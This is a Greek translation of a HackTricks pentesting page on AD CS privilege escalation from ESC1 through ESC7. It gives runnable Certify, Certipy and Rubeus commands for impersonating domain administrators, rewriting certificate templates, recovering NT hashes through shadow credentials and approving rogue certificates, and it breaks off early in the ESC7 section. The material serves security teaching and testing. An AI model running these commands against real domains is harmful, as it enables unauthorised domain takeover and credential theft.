# Ανόδος στον τομέα του AD CS Domain

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Αυτό είναι ένα σύνοψη των τεχνικών ανόδου τμήματος των αναρτήσεων:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Εσφαλμένα Πρότυπα Πιστοποιητικών - ESC1

### Εξήγηση

### Εξήγηση των Εσφαλμένων Προτύπων Πιστοποιητικών - ESC1

* **Τα δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.**
* **Δεν απαιτείται έγκριση διευθυντή.**
* **Δεν απαιτούνται υπογραφές από εξουσιοδοτημένο προσωπικό.**
* **Οι περιγραφείς ασφάλειας στα πρότυπα πιστοποιητικών είναι υπερβολικά επιεικείς, επιτρέποντας σε χρήστες με χαμηλά προνόμια να αποκτήσουν δικαιώματα εγγραφής.**
* **Τα πρότυπα πιστοποιητικών έχουν ρυθμιστεί για να ορίζουν EKUs που διευκολύνουν την πιστοποίηση:**
* Οι αναγνωριστές Επεκτεταμένης Χρήσης Κλειδιών (EKU) όπως η Πιστοποίηση Πελάτη (OID 1.3.6.1.5.5.7.3.2), Πιστοποίηση Πελάτη PKINIT (1.3.6.1.5.2.3.4), Σύνδεση με Έξυπνη Κάρτα (OID 1.3.6.1.4.1.311.20.2.2), Οποιοσδήποτε Σκοπός (OID 2.5.29.37.0), ή καμία EKU (SubCA) περιλαμβάνονται.
* **Η δυνατότητα για τους αιτούντες να συμπεριλάβουν ένα subjectAltName στο Αίτημα Υπογραφής Πιστοποιητικού (CSR) επιτρέπεται από το πρότυπο:**
* Το Active Directory (AD) δίνει προτεραιότητα στο subjectAltName (SAN) σε ένα πιστοποιητικό για τον έλεγχο ταυτότητας εάν υπάρχει. Αυτό σημαίνει ότι με την καθορισμένη SAN σε ένα CSR, μπορεί να ζητηθεί ένα πιστοποιητικό για να προσομοιώσει οποιονδήποτε χρήστη (π.χ. διαχειριστή τομέα). Εάν ο αιτών μπορεί να καθορίσει το SAN δείχνεται στο αντικείμενο AD του προτύπου πιστοποιητικού μέσω της ιδιότητας `mspki-certificate-name-flag`. Αυτή η ιδιότητα είναι ένα bitmask, και η παρουσία της σημαίας `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` επιτρέπει στον αιτούντα να καθορίσει το SAN.

{% hint style="danger" %}
Η διαμόρφωση που περιγράφεται επιτρέπει σε χρήστες με χαμηλά προνόμια να ζητήσουν πιστοποιητικά με οποιοδήποτε SAN της επιλογής τους, επιτρέποντας την πιστοποίηση ως οποιονδήποτε κύριο τομέα μέσω Kerberos ή SChannel.
{% endhint %}

Αυτό το χαρακτηριστικό ενεργοποιείται μερικές φορές για να υποστηρίξει τη δυνατότητα δημιουργίας πιστοποιητικών HTTPS ή host κατά την εκτέλεση από προϊόντα ή υπηρεσίες ανάπτυξης, ή λόγω έλλειψης κατανόησης.

Σημειώνεται ότι η δημιουργία ενός πιστοποιητικού με αυτήν την επιλογή ενεργοποιεί έναν προειδοποιητικό μηνύμα, το οποίο δεν συμβαίνει όταν ένα υπάρχον πρότυπο πιστοποιητικού (όπως το πρότυπο `WebServer`, που έχει ενεργοποιημένη την `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) αντιγράφεται και στη συνέχεια τροποποιείται για να περιλαμβάνει έναν αναγνωριστικό πιστοποίησης. 

### Κατάχρηση

Για να **βρείτε ευάλωτα πρότυπα πιστοποιητικών** μπορείτε να εκτελέσετε:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Για να **καταχραστείτε αυτήν την ευπάθεια για να προσωποποιήσετε έναν διαχειριστή**, μπορείτε να εκτελέσετε:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Τότε μπορείτε να μετατρέψετε το παραγόμενο **πιστοποιητικό στη μορφή `.pfx`** και να το χρησιμοποιήσετε για **πιστοποίηση χρησιμοποιώντας το Rubeus ή το certipy** ξανά:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Τα Windows binaries "Certreq.exe" & "Certutil.exe" μπορούν να χρησιμοποιηθούν για τη δημιουργία του PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Η απαρίθμηση των προτύπων πιστοποιητικών εντός του σχήματος διαμόρφωσης του AD Forest, ειδικότερα αυτών που δεν απαιτούν έγκριση ή υπογραφές, διαθέτουν ένα EKU Πιστοποίησης Πελάτη ή Είσοδος με Κάρτα Ελέγχου, και με τη σημαία `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ενεργοποιημένη, μπορεί να εκτελεστεί με την εκτέλεση του παρακάτω ερωτήματος LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Εσφαλμένα Πρότυπα Πιστοποιητικών - ESC2

### Εξήγηση

Το δεύτερο σενάριο κατάχρησης είναι μια παραλλαγή του πρώτου:

1. Τα δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.
2. Η απαίτηση για έγκριση διευθυντή είναι απενεργοποιημένη.
3. Η ανάγκη για εξουσιοδοτημένες υπογραφές παραλείπεται.
4. Ένα υπερβολικά επιτρεπτικό αποκριτήριο ασφαλείας στο πρότυπο πιστοποιητικού χορηγεί δικαιώματα εγγραφής πιστοποιητικού σε χρήστες με χαμηλά προνόμια.
5. **Το πρότυπο πιστοποιητικού ορίζεται να περιλαμβάνει το Any Purpose EKU ή κανένα EKU.**

Το **Any Purpose EKU** επιτρέπει την απόκτηση ενός πιστοποιητικού από έναν επιτιθέμενο για **οποιοδήποτε σκοπό**, συμπεριλαμβανομένης της πιστοποίησης πελάτη, της πιστοποίησης διακομιστή, της υπογραφής κώδικα, κ.λπ. Η ίδια **τεχνική που χρησιμοποιείται για το ESC3** μπορεί να χρησιμοποιηθεί για την εκμετάλλευση αυτού του σεναρίου.

Τα πιστοποιητικά με **κανένα EKU**, τα οποία λειτουργούν ως πιστοποιητικά υποδοχής CA, μπορούν να εκμεταλλευτούν για **οποιοδήποτε σκοπό** και μπορούν **επίσης να χρησιμοποιηθούν για την υπογραφή νέων πιστοποιητικών**. Έτσι, ένας επιτιθέμενος θα μπορούσε να καθορίσει τυχαία EKUs ή πεδία στα νέα πιστοποιητικά χρησιμοποιώντας ένα πιστοποιητικό υποδοχής CA.

Ωστόσο, τα νέα πιστοποιητικά που δημιουργούνται για **πιστοποίηση τομέα** δεν θα λειτουργήσουν εάν το υποδοχής CA δεν είναι εμπιστευμένο από το αντικείμενο **`NTAuthCertificates`**, το οποίο είναι η προεπιλεγμένη ρύθμιση. Παρ' όλα αυτά, ένας επιτιθέμενος μπορεί ακόμα να δημιουργήσει **νέα πιστοποιητικά με οποιοδήποτε EKU** και τιμές πιστοποιητικού. Αυτά θα μπορούσαν πιθανώς να **καταχραστούν** για μια ευρεία γκάμα σκοπών (π.χ., υπογραφή κώδικα, πιστοποίηση διακομιστή, κ.λπ.) και θα μπορούσαν να έχουν σημαντικές επιπτώσεις για άλλες εφαρμογές στο δίκτυο όπως SAML, AD FS ή IPSec.

Για να απαριθμήσετε τα πρότυπα που ταιριάζουν σε αυτό το σενάριο μέσα στο σχήμα διαμόρφωσης του δάσους AD, μπορεί να εκτελεστεί η ακόλουθη ερώτηση LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Εσφαλμένα ρυθμισμένα πρότυπα πράκτορα εγγραφής - ESC3

### Εξήγηση

Αυτό το σενάριο είναι παρόμοιο με το πρώτο και το δεύτερο, αλλά **καταχρώμενον** ένα **διαφορετικό EKU** (Πράκτορας Αίτησης Πιστοποίησης) και **2 διαφορετικά πρότυπα** (επομένως έχει 2 σύνολα απαιτήσεων),

Το **EKU του Πράκτορα Αίτησης Πιστοποίησης** (OID 1.3.6.1.4.1.311.20.2.1), γνωστό ως **Πράκτορας Εγγραφής** στην τεκμηρίωση της Microsoft, επιτρέπει σε έναν αρχέτυπο να **εγγραφεί** για ένα **πιστοποιητικό** εκ μέρους ενός άλλου χρήστη.

Ο **"πράκτορας εγγραφής"** εγγράφεται σε ένα τέτοιο **πρότυπο** και χρησιμοποιεί το αποτέλεσμα **πιστοποιητικό για συνυπογραφή ενός CSR εκ μέρους του άλλου χρήστη**. Στη συνέχεια **στέλνει** το **συνυπογεγραμμένο CSR** στον CA, εγγράφοντας σε ένα **πρότυπο** που επιτρέπει την "εγγραφή εκ μέρους", και ο CA απαντά με ένα **πιστοποιητικό που ανήκει στον "άλλο" χρήστη**.

**Απαιτήσεις 1:**

* Τα δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.
* Η απαίτηση για έγκριση διευθυντή παραλείπεται.
* Δεν υπάρχει απαίτηση για εξουσιοδοτημένες υπογραφές.
* Ο περιγραφέας ασφαλείας του προτύπου πιστοποιητικού είναι υπερβολικά επιεικής, χορηγώντας δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
* Το πρότυπο πιστοποιητικού περιλαμβάνει το EKU του Πράκτορα Αίτησης Πιστοποίησης, επιτρέποντας την αίτηση άλλων προτύπων πιστοποιητικών εκ μέρους άλλων αρχετύπων.

**Απαιτήσεις 2:**

* Το Enterprise CA χορηγεί δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
* Η έγκριση διευθυντή παρακάμπτεται.
* Η έκδοση σχήματος του προτύπου είναι είτε 1 είτε υπερβαίνει το 2, και καθορίζει μια Απαίτηση Έκδοσης Πολιτικής Εφαρμογής που απαιτεί το EKU του Πράκτορα Αίτησης Πιστοποίησης.
* Ένα EKU που ορίζεται στο πρότυπο πιστοποιητικού επιτρέπει την ταυτοποίηση τομέα.
* Δεν εφαρμόζονται περιορισμοί για τους πράκτορες εγγραφής στον CA.

### Κατάχρηση

Μπορείτε να χρησιμοποιήσετε το [**Certify**](https://github.com/GhostPack/Certify) ή το [**Certipy**](https://github.com/ly4k/Certipy) για να καταχρηστείτε αυτό το σενάριο:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Οι **χρήστες** που επιτρέπεται να **λάβουν** ένα **πιστοποιητικό πράκτορα εγγραφής**, οι πρότυποι στους οποίους οι πράκτορες εγγραφής επιτρέπεται να εγγραφούν και οι **λογαριασμοί** για τους οποίους ο πράκτορας εγγραφής μπορεί να ενεργήσει μπορούν να περιοριστούν από τις επιχειρησιακές CA. Αυτό επιτυγχάνεται ανοίγοντας το `certsrc.msc` **snap-in**, **δεξί κλικ στην CA**, **κάνοντας κλικ στις ιδιότητες**, και στη συνέχεια **πλοήγηση** στην καρτέλα "Πράκτορες Εγγραφής".

Ωστόσο, σημειώνεται ότι η **προεπιλεγμένη** ρύθμιση για τις CA είναι "Να μην περιορίζονται οι πράκτορες εγγραφής." Όταν οι διαχειριστές ενεργοποιούν τον περιορισμό στους πράκτορες εγγραφής, ρυθμίζοντάς τον σε "Περιορισμός πρακτόρων εγγραφής," η προεπιλεγμένη ρύθμιση παραμένει εξαιρετικά επιεικής. Επιτρέπει σε **Όλους** την πρόσβαση για εγγραφή σε όλους τους προτύπους ως οποιονδήποτε.

## Ευάλωτος Έλεγχος Πρόσβασης Προτύπων Πιστοποιητικών - ESC4

### **Εξήγηση**

Το **αποκριτήριο ασφαλείας** στα **πρότυπα πιστοποιητικών** καθορίζει τα **δικαιώματα** που κατέχουν συγκεκριμένοι **κύριοι AD** σχετικά με το πρότυπο.

Αν ένας **εισβολέας** διαθέτει τα απαιτούμενα **δικαιώματα** για να **τροποποιήσει** ένα **πρότυπο** και να **εφαρμόσει** οποιεσδήποτε **εκμεταλλεύσιμες λανθάνουσες ρυθμίσεις** που περιγράφονται σε **προηγούμενες ενότητες**, μπορεί να διευκολυνθεί η ανόδος προνομίων.

Σημαντικά δικαιώματα που εφαρμόζονται στα πρότυπα πιστοποιητικών περιλαμβάνουν:

* **Κάτοχος:** Χορηγεί αυτόματο έλεγχο επί του αντικειμένου, επιτρέποντας την τροποποίηση οποιωνδήποτε χαρακτηριστικών.
* **Πλήρης Έλεγχος:** Επιτρέπει πλήρη εξουσία επί του αντικειμένου, συμπεριλαμβανομένης της δυνατότητας τροποποίησης οποιωνδήποτε χαρακτηριστικών.
* **ΕγγραφήΚάτοχος:** Επιτρέπει την τροποποίηση του κατόχου του αντικειμένου σε έναν κύριο υπό τον έλεγχο του εισβολέα.
* **ΕγγραφήDacl:** Επιτρέπει τη ρύθμιση των ελέγχων πρόσβασης, πιθανώς χορηγώντας σε έναν εισβολέα Πλήρη Έλεγχο.
* **ΕγγραφήΙδιοκτησία:** Εξουσιοδοτεί την επεξεργασία οποιωνδήποτε ιδιοτήτων αντικειμένου.

### Κατάχρηση

Ένα παράδειγμα προηγούμενης ανόδου προνομίων όπως το προηγούμενο:

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

Το ESC4 είναι όταν ένας χρήστης έχει δικαιώματα εγγραφής σε ένα πρότυπο πιστοποιητικού. Αυτό μπορεί για παράδειγμα να καταχραστεί για να αντικαταστήσει τη διαμόρφωση του προτύπου πιστοποιητικού ώστε να γίνει ευάλωτο για το ESC1.

Όπως βλέπουμε στη διαδρομή παραπάνω, μόνο ο `JOHNPC` έχει αυτά τα δικαιώματα, αλλά ο χρήστης μας `JOHN` έχει το νέο όριο `AddKeyCredentialLink` στο `JOHNPC`. Καθώς αυτή η τεχνική σχετίζεται με πιστοποιητικά, έχω εφαρμόσει αυτήν την επίθεση επίσης, η οποία είναι γνωστή ως [Σκιώδεις Διαπιστεύσεις](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Εδώ ένα μικρό δείγμα της εντολής `shadow auto` του Certipy για την ανάκτηση του NT hash του θύματος.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** μπορεί να αντικαταστήσει τη διαμόρφωση ενός προτύπου πιστοποιητικού με ένα μόνο πλήκτρο. Από προεπιλογή, το Certipy θα αντικαταστήσει τη διαμόρφωση για να την καταστήσει ευάλωτη στο ESC1. Μπορούμε επίσης να καθορίσουμε την παράμετρο `-save-old` για να αποθηκεύσουμε την παλιά διαμόρφωση, η οποία θα είναι χρήσιμη για την επαναφορά της διαμόρφωσης μετά την επίθεσή μας.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Ευάλωτος Έλεγχος Πρόσβασης Αντικειμένων PKI - ESC5

### Εξήγηση

Το εκτεταμένο δίκτυο των διασυνδεδεμένων σχέσεων βασισμένων σε ACL, το οποίο περιλαμβάνει αρκετά αντικείμενα πέρα ​​από τα πρότυπα πιστοποιητικών και την αρχή πιστοποίησης, μπορεί να επηρεάσει την ασφάλεια ολόκληρου του συστήματος AD CS. Αυτά τα αντικείμενα, τα οποία μπορούν να επηρεάσουν σημαντικά την ασφάλεια, περιλαμβάνουν:

* Το αντικείμενο υπολογιστή AD του διακομιστή CA, το οποίο ενδέχεται να διαρρεύσει μέσω μηχανισμών όπως το S4U2Self ή το S4U2Proxy.
* Ο διακομιστής RPC/DCOM του διακομιστή CA.
* Οποιοδήποτε κατώτερο αντικείμενο ή δοχείο AD εντός της συγκεκριμένης διαδρομής δοχείου `CN=Δημόσιες Υπηρεσίες Κλειδιών,CN=Υπηρεσίες,CN=Διαμόρφωση,DC=<DOMAIN>,DC=<COM>`. Αυτή η διαδρομή περιλαμβάνει, αλλά δεν περιορίζεται σε, δοχεία και αντικείμενα όπως το δοχείο Πρότυπα Πιστοποιητικών, το δοχείο Αρχές Πιστοποίησης, το αντικείμενο NTAuthCertificates και το Δοχείο Υπηρεσιών Εγγραφής.

Η ασφάλεια του συστήματος PKI μπορεί να διακυβευτεί εάν ένας χρήστης με χαμηλά προνόμια καταφέρει να αναλάβει τον έλεγχο επί οποιουδήποτε από αυτά τα κρίσιμα στοιχεία.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Εξήγηση

Το θέμα που συζητήθηκε στην [**ανάρτηση της CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) αναφέρεται επίσης στις επιπτώσεις της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, όπως περιγράφεται από τη Microsoft. Αυτή η ρύθμιση, όταν ενεργοποιηθεί σε μια Αρχή Πιστοποίησης (CA), επιτρέπει τη συμπερίληψη **τιμών που ορίζονται από τον χρήστη** στο **εναλλακτικό όνομα υποκείμενου** για **οποιοδήποτε αίτημα**, συμπεριλαμβανομένων αυτών που δημιουργούνται από το Active Directory®. Ως εκ τούτου, αυτή η πρόνοια επιτρέπει σε έναν **εισβολέα** να εγγραφεί μέσω **οποιουδήποτε προτύπου** που έχει οριστεί για την πιστοποίηση τομέα—ειδικότερα αυτών που είναι ανοικτά για την εγγραφή χρηστών με **χαμηλά προνόμια**, όπως το τυπικό πρότυπο Χρήστη. Ως αποτέλεσμα, μπορεί να ασφαλιστεί ένα πιστοποιητικό, επιτρέποντας στον εισβολέα να πιστοποιηθεί ως διαχειριστής τομέα ή **οποιοδήποτε άλλο ενεργό οντότητα** εντός του τομέα.

**Σημείωση**: Η διαδικασία για την προσάρτηση **εναλλακτικών ονομάτων** σε ένα αίτημα υπογραφής πιστοποιητικού (CSR), μέσω του ορίσματος `-attrib "SAN:"` στο `certreq.exe` (αναφέρεται ως "Ζεύγη Ονομάτων"), παρουσιάζει μια **αντίθεση** από τη στρατηγική εκμετάλλευσης των SANs στο ESC1. Εδώ, η διαφορά βρίσκεται στον τρόπο που η πληροφορία λογαριασμού ενθυλακώνεται—εντός ενός χαρακτηριστικού πιστοποιητικού, αντί για μια επέκταση.

### Κατάχρηση

Για να επαληθεύσουν εάν η ρύθμιση είναι ενεργοποιημένη, οι οργανισμοί μπορούν να χρησιμοποιήσουν την ακόλουθη εντολή με το `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Αυτή η λειτουργία χρησιμοποιεί ουσιαστικά **απομακρυσμένη πρόσβαση στο μητρώο**, συνεπώς, μια εναλλακτική προσέγγιση θα μπορούσε να είναι:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Εργαλεία όπως το [**Certify**](https://github.com/GhostPack/Certify) και το [**Certipy**](https://github.com/ly4k/Certipy) είναι ικανά να ανιχνεύσουν αυτήν την κακή ρύθμιση και να την εκμεταλλευτούν:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Για να τροποποιήσετε αυτές τις ρυθμίσεις, υποθέτοντας ότι κάποιος διαθέτει **διαχειριστικά δικαιώματα τομέα** ή ισοδύναμα, μπορεί να εκτελεστεί η παρακάτω εντολή από οποιονδήποτε υπολογιστή:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Για να απενεργοποιήσετε αυτή τη διαμόρφωση στο περιβάλλον σας, η σημαία μπορεί να αφαιρεθεί με:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Μετά τις ενημερώσεις ασφαλείας του Μαΐου 2022, τα νεοεκδοθέντα **πιστοποιητικά** θα περιέχουν μια **επέκταση ασφαλείας** που ενσωματώνει την **ιδιότητα `objectSid` του αιτούντα**. Για το ESC1, αυτό το SID προέρχεται από το συγκεκριμένο SAN. Ωστόσο, για το **ESC6**, το SID αντικατοπτρίζει το **`objectSid` του αιτούντα**, όχι το SAN.\
Για να εκμεταλλευτείτε το ESC6, είναι απαραίτητο το σύστημα να είναι ευάλωτο στο ESC10 (Αδύναμες Αντιστοιχίσεις Πιστοποιητικών), το οποίο δίνει προτεραιότητα στο **SAN πάνω από τη νέα επέκταση ασφαλείας**.
{% endhint %}

## Ευάλωτος Έλεγχος Πρόσβασης Αρχής Πιστοποίησης - ESC7

### Επίθεση 1

#### Εξήγηση

Ο έλεγχος πρόσβασης για μια αρχή πιστοποίησης διατηρείται μέσω ενός συνόλου δικαιωμάτων που ελέγχουν τις ενέργειες της CA. Αυτά τα δικαιώματα μπορούν να προβληθούν από την πρόσβαση στο `certsrv.msc`, δεξί κλικ σε μια CA, επιλογή ιδιοτήτων και στη συνέχεια πλοήγηση στην καρτέλα Ασφάλειας. Επιπλέον, τα δικαιώματα μπορούν να απαριθμηθούν χρησιμοποιώντας το module PSPKI με εντολές όπως:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Αυτό παρέχει εισαγωγή στα κύρια δικαιώματα, δηλαδή τα **`ManageCA`** και **`ManageCertificates`**, που σχετίζονται με τους ρόλους "διαχειριστής CA" και "Διαχειριστής Πιστοποιητικών" αντίστοιχα.

#### Κατάχρηση

Έχοντας δικαιώματα **`ManageCA`** σε έναν αρμόδιο για πιστοποιητικά, ο υποκείμενος μπορεί να ρυθμίσει απομακρυσμένα τις ρυθμίσεις χρησιμοποιώντας το PSPKI. Αυτό περιλαμβάνει την εναλλαγή της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`** για να επιτραπεί η προδιαγραφή SAN σε οποιοδήποτε πρότυπο, ένα κρίσιμο στοιχείο της ανόδου στον τομέα.

Η απλοποίηση αυτής της διαδικασίας είναι εφικτή μέσω της χρήσης του εργαλείου **Enable-PolicyModuleFlag** του PSPKI, επιτρέποντας τροποποιήσεις χωρίς άμεση διεπαφή GUI.

Η κατοχή δικαιωμάτων **`ManageCertificates`** διευκολύνει την έγκριση εκκρεμών αιτημάτων, παρακάμπτοντας αποτελεσματικά την προστασία "έγκρισης διαχειριστή πιστοποιητικού CA".

Μια συνδυασμένη χρήση των ενοτήτων **Certify** και **PSPKI** μπορεί να χρησιμοποιηθεί για το αίτημα, την έγκριση και τον λήψη ενός πιστοποιητικού:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Επίθεση 2

#### Εξήγηση

{% hint style="warning" %}
Στην **προηγούμενη επίθεση** χρησιμοποιήθηκαν οι άδειες **`Manage CA`** για να ενεργοποιηθεί η σημαία **EDITF\_ATTRIBUTESUBJECTALTNAME2** για την εκτέλεση της επίθεσης **ESC6**, αλλά αυτό δεν θα έχει κανένα αποτέλεσμα μέχρι να επανεκκινηθεί η υπηρεσία CA (`CertSvc`). Όταν ένας χρήστης έχει το δικαίωμα πρόσβασης `Manage CA`, του επιτρέπεται επίσης να **επανεκκινήσει την υπηρεσία**. Ωστόσο, αυτό **δεν σημαίνει ότι ο χρήστης μπορεί να επανεκκινήσει την υπηρεσία απομακρυσμένα**. Επιπλέον, η **ESC6 ενδέχεται να μην λειτουργήσει απευθείας** σε περισσότερα περιβάλλοντα που έχουν εφαρμοστεί ενημερώσεις ασφαλείας τον Μάιο του 2022.
{% endhint %}

Συνεπώς, παρουσιάζεται εδώ μια άλλη επίθεση.

Προϋποθέσεις:

* Μόνο άδεια **`ManageCA`**
* Άδεια **`Manage Certificates`** (μπορεί να χορηγηθεί από το **`ManageCA`**)
* Το πρότυπο πιστοποιητικού **`SubCA`** πρέπει να είναι **ενεργοποιημένο** (μπορεί να ενεργοποιηθεί από το **`ManageCA`**)

Η τεχνική βασίζεται στο γεγονός ότι οι χρήστες με το δικαίωμα πρόσβασης `Manage CA` _και_ `Manage Certificates` μπορούν να **εκδώσουν αιτήσεις πιστοποιητικών που αποτυγχάνουν**. Το πρότυπο πιστοποιητικού **`SubCA`** είναι **ευάλωτο στην ESC1**, αλλά **μόνο οι διαχειριστές** μπορούν να εγγραφούν στο πρότυπο. Έτσι, ένας **χρήστης** μπορεί να **ζητήσει** να εγγραφεί στο **`SubCA`** - το οποίο θα **αρνηθεί** - αλλά **στη συνέχεια να εκδοθεί από τον διαχειριστή**.

#### Κατάχρηση

Μπορείτε να **χορηγήσετε στον εαυτό σας το δικαίωμα πρόσβασης `Manage Certificates`** προσθέτοντας τον χρήστη σας ως νέο υπάλληλο.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Ο πρότυπο **`SubCA`** μπορεί να ενεργοποιηθεί στο CA με την παράμετρο `-enable-template`. Από προεπιλογή, το πρότυπο `SubCA` είναι ενεργοποιημένο.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Αν έχουμε πληρούνται τις προϋποθέσεις για αυτήν την επίθεση, μπορούμε να ξεκινήσουμε με **το αίτημα ενός πιστοποιητικού βασισμένο στο πρότυπο `SubCA`**.

